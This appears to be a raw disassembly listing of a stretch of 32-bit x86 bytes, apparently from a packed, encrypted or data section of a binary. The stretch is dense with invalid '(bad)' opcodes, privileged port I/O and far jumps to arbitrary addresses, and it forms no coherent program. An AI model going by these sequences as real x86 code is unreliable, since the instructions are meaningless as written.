  409206:	mov    ds:0x175cf134,al
  40920b:	in     eax,dx
  40920c:	and    cl,BYTE PTR [edi-0x1a]
  40920f:	or     al,0xc
  409211:	add    DWORD PTR [ebp+edx*4+0x3e4b83c8],edx
  409218:	mov    edi,0xa965a926
  40921d:	push   0xc2a36aa8
  409222:	(bad)  
  409223:	jle    0x409275
  409225:	mov    eax,0xc6a48ee2
  40922a:	sub    ebp,eax
  40922c:	mov    ch,0x81
  40922e:	jbe    0x409229
  409230:	out    dx,eax
  409231:	push   0xffffff82
  409233:	call   0x11b786fe
  409238:	aaa    
  409239:	xchg   ebx,eax
  40923a:	(bad)  
  40923c:	(bad)  [ecx+0x58]
  40923f:	xchg   ebx,eax
  409240:	jbe    0x4091d2
  409242:	clc    
  409243:	stc    
  409244:	xchg   BYTE PTR [edi+0x477485c1],ah
  40924a:	sbb    DWORD PTR [edx-0x49],edx
  40924d:	lea    ebp,[ebx-0x6e]
  409250:	sti    
  409251:	lea    ebp,[ebp+0x6d]
  409254:	jo     0x409268
  409256:	mov    ecx,0xa7abc98d
  40925b:	js     0x4092dc
  40925d:	pop    es
  40925e:	(bad)  
  40925f:	jle    0x4092db
  409261:	bound  ebp,QWORD PTR [edi+edi*8-0x38]
  409265:	push   0x6c
  409267:	out    dx,al
  409268:	xchg   ebp,eax
  409269:	pop    esi
  40926a:	dec    edi
  40926b:	and    BYTE PTR [ebx+0x644f7112],ch
  409271:	enter  0x140e,0xfb
  409275:	(bad)
  409278:	div    DWORD PTR [ecx+0x2c]
  40927b:	push   ebx
  40927c:	jbe    0x409213
  40927e:	push   edx
  40927f:	pop    edx
  409280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409281:	shl    DWORD PTR [eax+0x45],1
  409284:	daa    
  409285:	retf   0xb158
  409288:	add    esp,DWORD PTR [ebx]
  40928a:	push   cs
  40928b:	or     edi,ebp
  40928d:	call   0x644ae5bf
  409292:	mov    cs,eax
  409294:	(bad)  
  409295:	pop    ecx
  409296:	push   ebx
  409297:	jl     0x4092ae
  409299:	call   0x1031b0c
  40929e:	adc    bh,BYTE PTR [edx]
  4092a0:	sbb    al,0x66
  4092a2:	cs jne 0x4092c0
  4092a5:	test   BYTE PTR [esi],ah
  4092a7:	enter  0x406b,0xe8
  4092ab:	loopne 0x409319
  4092ad:	fwait
  4092ae:	adc    al,0x74
  4092b0:	je     0x409293
  4092b2:	push   edx
  4092b3:	push   edi
  4092b4:	or     ah,BYTE PTR [edi]
  4092b6:	or     edi,ecx
  4092b8:	cdq    
  4092b9:	xor    eax,0x2fea91a2
  4092be:	(bad)  
  4092c0:	je     0x4092c3
  4092c2:	or     eax,DWORD PTR [edx]
  4092c4:	lods   al,BYTE PTR ds:[esi]
  4092c5:	pop    ss
  4092c6:	add    bh,BYTE PTR [eax+0x485a7480]
  4092cc:	div    BYTE PTR [esi+0x59]
  4092cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092d0:	fiadd  DWORD PTR ds:0xbea6acf0
  4092d6:	dec    BYTE PTR [ebp-0x79]
  4092d9:	loop   0x409281
  4092db:	out    0x15,al
  4092dd:	sub    BYTE PTR [ebx+esi*8],0xd9
  4092e1:	jmp    0x2914:0xada35d82
  4092e8:	sahf   
  4092e9:	(bad)  [edx+0x26e636d7]
  4092ef:	(bad)  
  4092f0:	or     esp,DWORD PTR [ebx]
  4092f2:	out    0xc,eax
  4092f4:	imul   ebp,DWORD PTR ds:0x308222d,0xc
  4092fb:	push   cs
  4092fc:	inc    ebp
  4092fd:	mov    bh,0xf4
  4092ff:	xlat   BYTE PTR ds:[ebx]
  409300:	xor    al,BYTE PTR [ecx+edi*4]
  409303:	adc    bl,BYTE PTR [ebp+0xa]
  409306:	xchg   BYTE PTR [esi-0x5],bh
  409309:	out    dx,eax
  40930a:	test   al,0x54
  40930c:	xlat   BYTE PTR ds:[ebx]
  40930d:	xchg   edi,eax
  40930e:	lods   eax,DWORD PTR ds:[esi]
  40930f:	cmp    eax,0xcf09958c
  409314:	dec    DWORD PTR [edx+ebp*1]
  409317:	mov    al,ds:0xfa670948
  40931c:	es mov ebx,0x118fe01f
  409322:	(bad)  
  409323:	sub    ah,BYTE PTR [edx+0x313ab448]
  409329:	cmp    dl,BYTE PTR [eax+0x27]
  40932c:	push   cs
  40932d:	mov    DWORD PTR [ecx+0x1e],esp
  409330:	add    edx,0xffffffd3
  409333:	jns    0x409331
  409335:	pop    edi
  409336:	daa    
  409337:	out    0xb7,eax
  409339:	imul   esi,DWORD PTR [esi-0x3c],0x4a
  40933d:	add    DWORD PTR [esi+eiz*2+0x97d58e],ebx
  409344:	popf   
  409345:	cmp    BYTE PTR [edx-0x10caad65],bl
  40934b:	jnp    0x409330
  40934d:	xor    DWORD PTR [edi],esp
  40934f:	mov    al,ds:0x8b13a1c1
  409354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409355:	test   eax,0x69f81985
  40935a:	pop    eax
  40935b:	or     eax,0xf3145c18
  409360:	scas   al,BYTE PTR es:[edi]
  409361:	jae    0x4092e4
  409363:	sbb    al,dl
  409365:	lods   al,BYTE PTR ds:[esi]
  409366:	mov    esp,0x80f5a517
  40936b:	jne    0x409359
  40936d:	(bad)  
  40936e:	mov    ebp,0xde5f8470
  409373:	fs mov cl,0xea
  409376:	fcomp  QWORD PTR [esi-0x4a]
  409379:	push   0xddad3f66
  40937e:	add    eax,0x1d5865bc
  409383:	das    
  409384:	mov    dh,0xa1
  409386:	in     al,dx
  409387:	(bad)  
  409388:	sub    eax,0xca86b914
  40938d:	pop    eax
  40938e:	pop    ebx
  40938f:	daa    
  409390:	xor    al,0x3b
  409392:	fistp  QWORD PTR [ebx]
  409394:	xchg   esp,eax
  409395:	and    al,ch
  409397:	sbb    al,0xd0
  409399:	leave  
  40939a:	sti    
  40939b:	adc    eax,0xffcc96e
  4093a0:	xchg   ch,cl
  4093a2:	imul   ebx,DWORD PTR [ecx],0x6d
  4093a5:	ss clc 
  4093a7:	jbe    0x40932b
  4093a9:	rcl    DWORD PTR [ecx+edi*1],cl
  4093ac:	add    dh,al
  4093ae:	adc    DWORD PTR [ecx+0x66],esp
  4093b1:	ret    
  4093b2:	fwait
  4093b3:	sub    ecx,DWORD PTR [esi]
  4093b5:	inc    edi
  4093b6:	xlat   BYTE PTR ds:[ebx]
  4093b7:	or     ah,BYTE PTR [edx-0x7a]
  4093ba:	jmp    0x9a21a961
  4093bf:	stc    
  4093c0:	or     eax,0xb7d4ef6b
  4093c5:	stos   BYTE PTR es:[edi],al
  4093c6:	call   0x95c4:0x24ad0268
  4093cd:	pop    esp
  4093ce:	or     DWORD PTR [esi],edi
  4093d0:	(bad)  
  4093d1:	xchg   esp,eax
  4093d2:	or     DWORD PTR [esi+0x557360fc],edx
  4093d8:	mov    ecx,0xcc6022dd
  4093dd:	rol    BYTE PTR [eax+ebp*2+0xd03f2c7],1
  4093e4:	push   edi
  4093e5:	add    al,0x42
  4093e7:	sub    BYTE PTR [ebx+0x3cfab113],al
  4093ed:	in     eax,dx
  4093ee:	jae    0x409388
  4093f0:	(bad)  
  4093f1:	stc    
  4093f2:	fmul   st(0),st
  4093f4:	push   ebp
  4093f5:	icebp  
  4093f6:	push   ebp
  4093f7:	pop    esi
  4093f8:	inc    eax
  4093f9:	and    bl,0x9d
  4093fc:	inc    edi
  4093fd:	or     dh,ch
  4093ff:	stc    
  409400:	pop    es
  409401:	arpl   WORD PTR [edx-0xe],cx
  409404:	add    dh,BYTE PTR [esp+ebp*4+0x42d28c93]
  40940b:	pop    eax
  40940c:	cmovnp ebx,ebp
  40940f:	test   DWORD PTR [ebx+0x70],ebx
  409412:	push   eax
  409413:	dec    ebx
  409414:	push   ss
  409415:	sub    ecx,DWORD PTR [ecx]
  409417:	mov    ecx,0xf1aac04d
  40941c:	mov    DWORD PTR [eax],ebx
  40941e:	sti    
  40941f:	mov    al,0x6c
  409421:	mov    ebp,0xbd310066
  409426:	inc    esp
  409427:	mov    esp,0xd88f47f2
  40942c:	mov    ch,BYTE PTR [eax-0x17]
  40942f:	inc    ebx
  409430:	enter  0x76c2,0xf
  409434:	loop   0x4093bd
  409436:	aas    
  409437:	test   al,0x44
  409439:	cmc    
  40943a:	call   0xd9f1fa4a
  40943f:	mov    dl,0xf7
  409441:	push   ss
  409442:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409443:	scas   al,BYTE PTR es:[edi]
  409444:	call   0x62d43a9a
  409449:	xchg   esi,eax
  40944a:	push   ds
  40944b:	fcomp  QWORD PTR [esi-0x28d2cbd1]
  409451:	cld    
  409452:	mov    esi,0xa5049b91
  409457:	and    al,0x1c
  409459:	pop    ebp
  40945a:	push   cs
  40945b:	add    bh,cl
  40945d:	push   0xc797b11d
  409462:	pusha  
  409463:	aas    
  409464:	dec    eax
  409465:	rcr    DWORD PTR [eax],cl
  409467:	cmc    
  409468:	adc    al,0x1a
  40946a:	xor    cl,BYTE PTR [ecx-0x1f0034e1]
  409470:	in     al,dx
  409471:	lea    esp,[ecx]
  409473:	push   esi
  409474:	xchg   DWORD PTR [edi-0x100420c6],eax
  40947a:	add    eax,0x125749b0
  40947f:	jnp    0x4094db
  409481:	pop    esi
  409482:	push   ebp
  409483:	pop    ebp
  409484:	push   cs
  409485:	jmp    0x409461
  409487:	aas    
  409488:	jne    0x409468
  40948a:	sub    DWORD PTR [edi-0x21],ecx
  40948d:	ins    BYTE PTR es:[edi],dx
  40948e:	cdq    
  40948f:	sti    
  409490:	add    cl,BYTE PTR [ecx]
  409492:	(bad)  
  409493:	test   BYTE PTR [ebp+0x39ae053b],dh
  409499:	je     0x409513
  40949b:	dec    eax
  40949c:	scas   al,BYTE PTR es:[edi]
  40949d:	fist   WORD PTR [ecx+0x1]
  4094a0:	and    DWORD PTR [ebx],edx
  4094a2:	scas   eax,DWORD PTR es:[edi]
  4094a3:	sub    esi,DWORD PTR [ebx-0x70]
  4094a6:	fwait
  4094a7:	and    ah,BYTE PTR [edi+0x7f]
  4094aa:	adc    cl,bl
  4094ac:	jmp    0xebac:0xf920003f
  4094b3:	adc    BYTE PTR [eax+0x9d96213],ah
  4094b9:	and    esp,ecx
  4094bb:	mov    dl,0xb0
  4094bd:	in     al,0xf9
  4094bf:	mov    fs,WORD PTR [ebx-0x14b6e644]
  4094c5:	mov    ebp,DWORD PTR [esi]
  4094c7:	das    
  4094c8:	cwde   
  4094c9:	inc    eax
  4094ca:	aas    
  4094cb:	dec    esi
  4094cc:	xor    bh,cl
  4094ce:	outs   dx,DWORD PTR ds:[esi]
  4094cf:	mov    ch,0x7
  4094d1:	xchg   DWORD PTR [ebp-0x6176a859],eax
  4094d7:	pop    esp
  4094d8:	inc    esi
  4094d9:	loope  0x4094b0
  4094db:	retf   0x50ba
  4094de:	xadd   edx,ebp
  4094e1:	dec    eax
  4094e2:	add    al,0xf6
  4094e4:	sbb    DWORD PTR [eax+ecx*2-0x3f040bd4],esi
  4094eb:	loop   0x40954c
  4094ed:	ins    BYTE PTR es:[edi],dx
  4094ee:	mov    ds:0x1368882c,eax
  4094f3:	lods   al,BYTE PTR ds:[esi]
  4094f4:	sub    ecx,esp
  4094f6:	inc    ebx
  4094f7:	int    0x96
  4094f9:	xchg   ecx,eax
  4094fa:	xchg   esi,eax
  4094fb:	mov    BYTE PTR [ebx-0x2c7c858d],ch
  409501:	iret   
  409502:	add    esp,0x729387e2
  409508:	dec    esi
  409509:	imul   ebx,DWORD PTR [edx],0xfffffffa
  40950c:	xchg   esi,eax
  40950d:	(bad)  
  40950e:	cld    
  40950f:	mov    ds:0x1392ef83,al
  409514:	jl     0x4094a9
  409516:	cmp    DWORD PTR [edx],eax
  409518:	leave  
  409519:	arpl   cx,bp
  40951b:	cdq    
  40951c:	ror    BYTE PTR [edi+eiz*4+0x0],0xd
  409521:	inc    ecx
  409522:	xor    eax,0x560ab480
  409527:	scas   al,BYTE PTR es:[edi]
  409528:	dec    esp
  409529:	xchg   ecx,eax
  40952a:	pusha  
  40952b:	fs retf 0xb93f
  40952f:	mov    bl,0xff
  409531:	(bad)  
  409532:	das    
  409533:	in     al,dx
  409534:	mov    dh,ch
  409536:	fwait
  409537:	das    
  409538:	add    al,0xf6
  40953a:	pop    eax
  40953b:	inc    esp
  40953c:	jb     0x4094cf
  40953e:	repnz lds edx,FWORD PTR [edi-0x583dc1c7]
  409545:	daa    
  409546:	add    al,0x81
  409548:	xchg   ebx,eax
  409549:	out    dx,al
  40954a:	mov    al,0x22
  40954c:	sbb    DWORD PTR [edx+edx*2+0x20],edx
  409550:	push   DWORD PTR [eax-0x2f]
  409553:	jmp    0xf6c8048a
  409558:	test   eax,0x41b6f771
  40955d:	xchg   edx,eax
  40955e:	les    eax,FWORD PTR [edi+0x7fafccd2]
  409564:	sub    ch,BYTE PTR [edx+eax*4+0x239e3d3d]
  40956b:	add    bh,BYTE PTR [edi-0x9]
  40956e:	mov    gs,WORD PTR [esi-0x1ae76f56]
  409574:	pusha  
  409575:	sub    al,ch
  409577:	pop    ebx
  409578:	cmp    bl,al
  40957a:	sub    DWORD PTR [ecx-0x30269699],0xffffffaf
  409581:	outs   dx,DWORD PTR ds:[esi]
  409582:	add    dl,BYTE PTR [si]
  409585:	dec    esi
  409586:	test   eax,0xec7d01eb
  40958b:	in     eax,dx
  40958c:	das    
  40958d:	sub    DWORD PTR [ecx],edx
  40958f:	hlt    
  409590:	enter  0xa8a,0x62
  409594:	retf   0x31b6
  409597:	cmp    BYTE PTR [ecx],al
  409599:	ret    
  40959a:	out    dx,al
  40959b:	xor    bl,BYTE PTR ss:[edi+0x179a6b]
  4095a2:	dec    esp
  4095a3:	xor    al,0xb2
  4095a5:	adc    eax,0xc30402c
  4095aa:	or     DWORD PTR [eax+0x6ceb5b21],eax
  4095b0:	shl    DWORD PTR [ebx+0x4e375fae],cl
  4095b6:	jbe    0x40960e
  4095b8:	(bad)  
  4095b9:	mov    ebp,0x52986b36
  4095be:	xor    DWORD PTR [esi],ecx
  4095c0:	ret    
  4095c1:	mov    edx,0x57587ebc
  4095c6:	nop
  4095c7:	aam    0x7e
  4095c9:	sbb    ebp,esi
  4095cb:	jl     0x4095f5
  4095cd:	xchg   esp,eax
  4095ce:	pusha  
  4095cf:	iret   
  4095d0:	and    edi,DWORD PTR [eax-0x49f8af3e]
  4095d6:	outs   dx,DWORD PTR ds:[esi]
  4095d7:	fldpi  
  4095d9:	out    0x40,al
  4095db:	pop    eax
  4095dc:	pop    ds
  4095dd:	stos   BYTE PTR es:[edi],al
  4095de:	cmp    ah,BYTE PTR [esi]
  4095e0:	xchg   edi,eax
  4095e1:	aas    
  4095e2:	inc    ebp
  4095e3:	out    0x90,al
  4095e5:	imul   esi,ebx,0xe8d30374
  4095eb:	shl    BYTE PTR [edi],1
  4095ed:	sub    esi,DWORD PTR [edx+0x4b782bf4]
  4095f3:	fdiv   st(6),st
  4095f5:	sbb    eax,DWORD PTR [ecx-0x530f9ebe]
  4095fb:	adc    ebx,DWORD PTR [ebp+0x5579e235]
  409601:	stc    
  409602:	xor    ch,0xe8
  409605:	ds sub al,0x62
  409608:	dec    ebp
  409609:	out    dx,al
  40960a:	ss push eax
  40960c:	sar    BYTE PTR [esi+0x54],0x75
  409610:	inc    edi
  409611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409612:	jbe    0x4095d5
  409614:	mov    DWORD PTR ss:0x43606ea5,esp
  40961b:	jnp    0x4095b0
  40961d:	pop    esi
  40961e:	pushf  
  40961f:	test   BYTE PTR [edi+ebx*1+0xad446f1],al
  409626:	sbb    ah,0x20
  409629:	arpl   WORD PTR [ebp-0x9ceacf7],sp
  40962f:	sub    BYTE PTR [edx+0x23e90727],dl
  409635:	jbe    0x4096a7
  409637:	in     al,dx
  409638:	in     eax,dx
  409639:	xchg   ebx,eax
  40963a:	fisttp QWORD PTR [ebx]
  40963c:	popa   
  40963d:	cmp    DWORD PTR cs:[esi],esp
  409640:	jns    0x4096a6
  409642:	and    ah,0x6a
  409645:	xchg   esi,eax
  409646:	dec    ebx
  409647:	(bad)  
  409649:	cmp    al,0xd5
  40964b:	inc    ebp
  40964c:	cli    
  40964d:	out    0xfe,eax
  40964f:	inc    ebx
  409650:	in     eax,0x35
  409652:	mov    bl,0xf4
  409654:	and    ch,BYTE PTR [ebp+0x25]
  409657:	mov    ebx,0x7fac53e
  40965c:	jne    0x409666
  40965e:	pop    edi
  40965f:	fstp   QWORD PTR [ebx]
  409661:	mov    ebx,0x7aa79154
  409666:	adc    al,0xb0
  409668:	ss mov dl,0xa3
  40966b:	cli    
  40966c:	pop    ds
  40966d:	push   cs
  40966e:	nop
  40966f:	les    ecx,FWORD PTR [edi+0x57]
  409672:	les    ebp,FWORD PTR [edi+0x238da446]
  409678:	aad    0xa2
  40967a:	add    bl,ch
  40967c:	ret    0xca23
  40967f:	xor    edi,DWORD PTR [ebx+esi*1+0x63]
  409683:	sub    eax,0xcd2c8cde
  409688:	xor    ecx,DWORD PTR [ecx+0x58]
  40968b:	(bad)  
  40968d:	int3   
  40968e:	push   es
  40968f:	push   0xffffffaf
  409691:	adc    eax,0x6313e696
  409696:	int3   
  409697:	sbb    al,0x8
  409699:	push   esi
  40969b:	mov    edx,0xe3875823
  4096a0:	sbb    bl,BYTE PTR [esi]
  4096a2:	inc    edx
  4096a3:	cmp    eax,0x55c5a391
  4096a8:	imul   edi,DWORD PTR [ecx-0x4b],0x1b547654
  4096af:	mov    dl,0xb8
  4096b1:	mov    cl,0x2
  4096b3:	dec    edi
  4096b4:	and    al,0x5b
  4096b6:	int3   
  4096b7:	inc    ecx
  4096b8:	stos   DWORD PTR es:[edi],eax
  4096b9:	xchg   ebx,eax
  4096ba:	in     al,0x78
  4096bc:	pop    eax
  4096bd:	(bad)  
  4096be:	jl     0x4096c2
  4096c0:	push   ebp
  4096c1:	(bad)  
  4096c2:	stos   BYTE PTR es:[edi],al
  4096c3:	test   DWORD PTR [ebx+0x31],0xf9157b34
  4096ca:	std    
  4096cb:	js     0x409718
  4096cd:	sbb    al,0x1c
  4096cf:	or     al,dh
  4096d1:	push   esp
  4096d2:	stc    
  4096d3:	xor    cl,dl
  4096d5:	cmp    al,0x56
  4096d7:	and    ebp,DWORD PTR [ecx-0x2883a140]
  4096dd:	ins    BYTE PTR es:[edi],dx
  4096de:	pop    es
  4096df:	clc    
  4096e0:	imul   ebx,DWORD PTR [esp+ebp*4-0xf],0xe9e83ed1
  4096e8:	int    0xa8
  4096ea:	sub    ecx,DWORD PTR [ebx+0x413711bf]
  4096f0:	cdq    
  4096f1:	shl    BYTE PTR [eax],cl
  4096f3:	mov    gs:0x64301269,al
  4096f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096fa:	xchg   edi,eax
  4096fb:	or     eax,0x90bc18bc
  409700:	ret    
  409701:	scas   eax,DWORD PTR es:[edi]
  409702:	test   eax,0x9d180e6b
  409707:	xor    BYTE PTR [esp+ebp*2],bl
  40970a:	into   
  40970b:	test   eax,0xb4fac8ce
  409710:	xchg   edi,eax
  409711:	ret    0xa90
  409714:	push   cs
  409715:	and    bh,dl
  409717:	sub    DWORD PTR [ebx+0x61],edi
  40971a:	xor    DWORD PTR [esi+edx*4+0x1b0d8221],edx
  409721:	push   ebp
  409722:	or     ebp,esp
  409724:	sbb    al,dh
  409726:	outs   dx,DWORD PTR ds:[esi]
  409727:	icebp  
  409728:	or     al,0xf3
  40972a:	cmp    al,al
  40972c:	outs   dx,DWORD PTR ds:[esi]
  40972d:	sub    esp,DWORD PTR [ecx+0x68b42e05]
  409733:	xchg   BYTE PTR [edi-0x3fb130bb],ch
  409739:	sar    BYTE PTR [edi+eax*8-0x51577878],1
  409740:	and    eax,0xa741f795
  409745:	iret   
  409746:	jl     0x409705
  409748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409749:	data16 aad 0x7a
  40974c:	ja     0x4097b7
  40974e:	cmp    BYTE PTR [ecx+0x5734ea5a],al
  409754:	jae    0x40974e
  409756:	push   0x33888d13
  40975b:	bound  eax,QWORD PTR [esp+edi*8-0x4e]
  40975f:	js     0x4096fc
  409761:	bound  ebx,QWORD PTR cs:[si+0x677b]
  409767:	aam    0x34
  409769:	push   ds
  40976a:	dec    edx
  40976b:	(bad)  
  40976c:	fnstenv [ebp+eax*2-0x66]
  409770:	pop    ebp
  409771:	sbb    DWORD PTR [ebp-0x29],esi
  409774:	mov    esi,gs
  409776:	and    al,0x70
  409778:	jmp    0x47ebd80c
  40977d:	(bad)  
  40977e:	ss mov edx,0xaa23fc27
  409784:	repz (bad) 
  409786:	mov    edx,0xb0ed1f1b
  40978b:	test   dh,ah
  40978d:	stos   BYTE PTR es:[edi],al
  40978e:	jl     0x409768
  409790:	cmp    ebp,DWORD PTR [edi]
  409792:	inc    ebx
  409793:	push   ebp
  409794:	add    al,BYTE PTR [ebx+ebp*8+0x1106e21c]
  40979b:	mov    eax,0xc54cb71f
  4097a0:	xchg   edx,eax
  4097a1:	int3   
  4097a2:	in     eax,dx
  4097a3:	popf   
  4097a4:	icebp  
  4097a5:	xchg   esi,eax
  4097a6:	shr    esp,0x36
  4097a9:	inc    ebx
  4097aa:	mov    ebp,0x19522413
  4097af:	dec    ebp
  4097b0:	or     edi,ebp
  4097b2:	mov    ebp,0x6e2c8f82
  4097b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097b8:	idiv   BYTE PTR [ebp+0x6d]
  4097bb:	sub    DWORD PTR [ebx+0x2c1f3792],ecx
  4097c1:	in     eax,dx
  4097c2:	dec    esp
  4097c3:	fstp   QWORD PTR [edi+ebp*4]
  4097c6:	pop    ds
  4097c7:	rcr    BYTE PTR [edx+0x3d96cbad],0x96
  4097ce:	fist   DWORD PTR [esi]
  4097d0:	jns    0x4097c9
  4097d2:	jl     0x40975e
  4097d4:	mov    al,ds:0x101daa41
  4097d9:	mov    edx,edx
  4097db:	and    ebp,eax
  4097dd:	jb     0x40985a
  4097df:	or     ecx,DWORD PTR [eax]
  4097e1:	and    BYTE PTR [edi-0x19b5506f],ch
  4097e7:	sbb    BYTE PTR [edi+0x7af224c3],ah
  4097ed:	adc    edx,edi
  4097ef:	inc    ebx
  4097f0:	mov    cl,BYTE PTR ds:0xe3c911d5
  4097f6:	cmp    ebx,DWORD PTR [esp+esi*1+0x15815612]
  4097fd:	or     ebp,DWORD PTR [ecx]
  4097ff:	mov    al,ds:0x360e6c32
  409804:	call   0x7d593060
  409809:	add    ecx,ecx
  40980b:	sbb    DWORD PTR [eax],0xffffff8e
  40980e:	adc    DWORD PTR [edi],ecx
  409810:	and    BYTE PTR [eax+0xb],ah
  409813:	pop    ds
  409814:	xor    al,0x79
  409816:	outs   dx,DWORD PTR ds:[esi]
  409817:	retf   
  409818:	mov    bl,0x55
  40981a:	mov    eax,0x9c566447
  40981f:	add    dh,BYTE PTR [ebx]
  409821:	jb     0x4097d5
  409823:	mov    ds:0x3b7b7d09,eax
  409828:	mov    DWORD PTR [esi+0x6931b182],ecx
  40982e:	mov    ?,WORD PTR [bx+di]
  409831:	jno    0x4098a9
  409833:	sbb    al,0x47
  409835:	jb     0x4097d8
  409837:	sub    al,0x4a
  409839:	mov    edx,0x881989f9
  40983e:	cmp    BYTE PTR [edi],ah
  409840:	iret   
  409841:	(bad)  
  409842:	mov    edx,0x54d3d28
  409847:	cmp    dl,dh
  409849:	ins    DWORD PTR es:[edi],dx
  40984a:	test   al,0xd
  40984c:	imul   edi,DWORD PTR ds:0x94dcc364,0x36
  409853:	xchg   edx,eax
  409854:	ds pusha 
  409856:	push   edx
  409857:	lods   eax,DWORD PTR ds:[esi]
  409858:	fdiv   st(7),st
  40985a:	mov    dh,0x36
  40985c:	outs   dx,DWORD PTR ds:[esi]
  40985d:	cmp    BYTE PTR [edx-0x66],ch
  409860:	pop    esi
  409861:	rol    BYTE PTR [ebx],cl
  409863:	in     al,dx
  409864:	push   0x7ad1f92c
  409869:	test   ah,0xae
  40986c:	mov    al,ds:0xa9105627
  409871:	pop    esi
  409872:	mov    cl,0x8e
  409874:	or     al,0x6f
  409876:	or     DWORD PTR [esp+edx*1+0x59ad4f2e],edx
  40987d:	aas    
  40987e:	js     0x409827
  409880:	les    esp,FWORD PTR [ebp+edx*8-0x68]
  409884:	mov    eax,0x2dc7f364
  409889:	xor    DWORD PTR [edi-0x63336e6b],edx
  40988f:	mov    esp,0x9569f6dd
  409894:	mov    esp,0x62a244b3
  409899:	rol    DWORD PTR [edi-0xd],1
  40989c:	inc    ebx
  40989d:	(bad)  
  40989e:	mov    ds:0x19c53107,eax
  4098a3:	or     BYTE PTR [eax],ch
  4098a5:	frstor [ebx+0x4b]
  4098a8:	sbb    bl,al
  4098aa:	or     eax,0x7e518511
  4098af:	jmp    0xfaf8:0x6f2f0612
  4098b6:	lea    edi,[eax]
  4098b8:	stc    
  4098b9:	add    edx,DWORD PTR [bp+di+0xc]
  4098bd:	push   edi
  4098be:	add    al,0xed
  4098c0:	retf   
  4098c1:	jecxz  0x409892
  4098c3:	gs aas 
  4098c5:	jbe    0x409940
  4098c7:	inc    DWORD PTR [ebx+0x303e9730]
  4098cd:	push   cs
  4098ce:	ret    0x8e71
  4098d1:	and    eax,0x997741ac
  4098d6:	cdq    
  4098d7:	scas   al,BYTE PTR es:[edi]
  4098d8:	arpl   sp,bx
  4098da:	test   BYTE PTR [eax-0x40],bl
  4098dd:	push   ebp
  4098de:	cmc    
  4098df:	cmp    al,0x16
  4098e1:	jge    0x4098e9
  4098e3:	scas   eax,DWORD PTR es:[edi]
  4098e4:	push   0xaa91c96
  4098e9:	or     BYTE PTR [eax+0x60e9f1b],al
  4098ef:	jmp    0x4098ae
  4098f1:	scas   eax,DWORD PTR es:[edi]
  4098f2:	dec    ebp
  4098f3:	daa    
  4098f4:	leave  
  4098f5:	cs sar edi,cl
  4098f8:	inc    esp
  4098f9:	retf   
  4098fa:	test   BYTE PTR [ebp-0x1a],ch
  4098fd:	test   ah,dh
  4098ff:	jo     0x4098fb
  409901:	pop    eax
  409902:	out    0xed,al
  409904:	add    BYTE PTR [eax+0x33ccb5c4],ah
  40990a:	push   ebp
  40990b:	fmul   DWORD PTR [ecx+0x1f895eb7]
  409911:	or     dh,cl
  409913:	mov    ebx,0x41e414bb
  409918:	cmp    al,BYTE PTR [edi]
  40991a:	scas   eax,DWORD PTR es:[edi]
  40991b:	xor    ebx,ebx
  40991d:	jl     0x4098d5
  40991f:	dec    edi
  409920:	out    dx,eax
  409921:	(bad)  
  409922:	out    0xd4,al
  409924:	adc    edx,DWORD PTR [ecx-0x67]
  409927:	sbb    eax,0x2e16699b
  40992c:	push   DWORD PTR [esi-0x12605df8]
  409932:	ret    
  409933:	cs pop ecx
  409935:	push   ebp
  409936:	call   0xad9f:0x69c16f48
  40993d:	dec    esi
  40993e:	dec    edi
  40993f:	mov    esp,0xfda15a59
  409944:	into   
  409945:	addr16 leave 
  409947:	sbb    esi,DWORD PTR [eax]
  409949:	test   al,0x68
  40994b:	or     BYTE PTR [eax],0x5c
  40994e:	pop    esi
  40994f:	xor    esp,DWORD PTR [eax]
  409951:	div    DWORD PTR [esi-0x850f7d6]
  409957:	xor    edx,ecx
  409959:	popf   
  40995a:	mov    bh,0xae
  40995c:	cmp    bh,BYTE PTR ds:0x83a220f7
  409962:	add    ah,BYTE PTR [edx-0x11]
  409965:	jnp    0x409902
  409967:	push   eax
  409968:	out    0x41,al
  40996a:	push   DWORD PTR [eax]
  40996c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996d:	sbb    al,0xa
  40996f:	dec    esi
  409970:	loope  0x4099aa
  409972:	cmp    ch,ch
  409974:	stos   BYTE PTR es:[edi],al
  409975:	outs   dx,DWORD PTR ds:[esi]
  409976:	or     DWORD PTR [eax-0xfe994c],edi
  40997c:	inc    ebp
  40997d:	ds stc 
  40997f:	sti    
  409980:	idiv   BYTE PTR [esi+0x7ac0dde7]
  409986:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409988:	add    DWORD PTR [eax+0x4e],0x16
  40998c:	lods   eax,DWORD PTR ds:[esi]
  40998d:	scas   eax,DWORD PTR es:[edi]
  40998e:	or     eax,0xc409d023
  409993:	loopne 0x409a0c
  409995:	mov    WORD PTR [ebp+0x46],gs
  409998:	js     0x4099a5
  40999a:	dec    eax
  40999b:	inc    eax
  40999c:	call   0xf414:0x1012701f
  4099a3:	sbb    eax,0x8e2516d2
  4099a8:	(bad)  
  4099a9:	int    0x11
  4099ab:	int    0xbb
  4099ad:	scas   al,BYTE PTR es:[edi]
  4099ae:	std    
  4099af:	loope  0x4099bf
  4099b1:	data16 je 0x4099ed
  4099b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099b5:	test   DWORD PTR [edx],0xd3db8790
  4099bb:	aad    0xe4
  4099bd:	xor    eax,0x37928a52
  4099c2:	gs mov ch,0xfc
  4099c5:	xor    al,BYTE PTR [edi-0x7ce36865]
  4099cb:	mov    bl,0x93
  4099cd:	hlt    
  4099ce:	sbb    ah,BYTE PTR [esi-0x549dbd5f]
  4099d4:	push   edx
  4099d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099d6:	jecxz  0x4099b7
  4099d8:	inc    ebp
  4099d9:	daa    
  4099da:	repnz aas 
  4099dc:	gs ss pop ss
  4099df:	adc    ebp,0xffffffe8
  4099e2:	lahf   
  4099e3:	(bad)  
  4099e4:	mov    al,0xc1
  4099e6:	xor    dl,BYTE PTR [esi]
  4099e8:	fwait
  4099e9:	pop    ebp
  4099ea:	dec    edx
  4099eb:	push   ecx
